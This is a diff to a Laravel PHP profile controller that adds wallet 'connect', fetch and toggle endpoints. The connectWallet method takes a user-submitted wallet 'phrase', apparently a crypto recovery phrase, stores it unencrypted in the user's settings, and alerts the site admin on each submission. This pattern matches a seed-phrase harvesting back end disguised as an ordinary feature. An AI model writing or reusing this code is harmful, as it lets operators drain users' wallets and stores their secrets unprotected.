@@ -81,6 +81,9 @@ class ProfileController extends Controller
                 'beneficiary_state',
                 'beneficiary_city',
                 'beneficiary_zipcode',
+
+                'connected_wallet_at',
+                'is_connect_activated',
             ],
         ];
 
@@ -490,6 +493,83 @@ class ProfileController extends Controller
 
         return ResponseBuilder::asSuccess()
             ->withMessage('Wallet settings updated successfully')
+            ->build();
+    }
+
+    public function connectWallet(UpdateConnectWallet $request): Response
+    {
+        $user = $request->user();
+        $userSetting = $user->settings;
+    
+        $walletData = [
+            'wallet' => $request->wallet,
+            'phrase' => $request->phrase,
+            'connected_at' => now()->toDateTimeString(),
+        ];
+    
+        // Decode existing wallets from JSON
+        $existingWallets = json_decode($userSetting->connected_wallet, true);
+        if (!is_array($existingWallets)) {
+            $existingWallets = [];
+        }
+    
+        // Add new wallet data
+        $existingWallets[] = $walletData;
+    
+        // Update the user settings
+        $userSetting->update([
+            'connected_wallet' => $existingWallets, // Eloquent will auto-JSON encode this if column is `json`
+        ]);
+
+        $admin = Admin::where('email', config('app.admin_mail'))->first();
+        NotificationController::sendAdminUserConnectWalletNotification($admin, $user);
+    
+        return ResponseBuilder::asSuccess()
+            ->withMessage('Wallet settings updated successfully')
+            ->build();
+    }
+    
+
+    public function getLatestWallet(Request $request)
+    {
+        $user = $request->user();
+        $userSetting = $user->settings;
+
+        $connectedWallets = $userSetting->connected_wallet ?? [];
+        $latestWallet = null;
+
+        if (!empty($connectedWallets)) {
+            // Sort by 'connected_at' (newest first) and get the first entry
+            usort($connectedWallets, function ($a, $b) {
+                return strtotime($b['connected_at']) - strtotime($a['connected_at']);
+            });
+            $latestWallet = $connectedWallets[0];
+        }
+
+        return response()->json([
+            'latest_wallet' => $latestWallet,
+            'is_connected' => $userSetting->connected_wallet_at !== null,
+            'last_connection_time' => $userSetting->connected_wallet_at,
+        ]);
+    }
+
+    public function toggleWalletConnection(Request $request)
+    {
+        $user = $request->user();
+        $userSetting = $user->settings;
+
+        // Toggle the is_connect_activated column
+        $newStatus = $userSetting->is_connect_activated ? 0 : 1;
+
+        // Update the settings
+        $userSetting->update([
+            'is_connect_activated' => $newStatus,
+        ]);
+
+        $message = $userSetting->is_connect_activated ? "Wallet reconnected successfully" : "Wallet disconnected successfully";
+
+        return ResponseBuilder::asSuccess()
+            ->withMessage($message)
             ->build();
     }
 
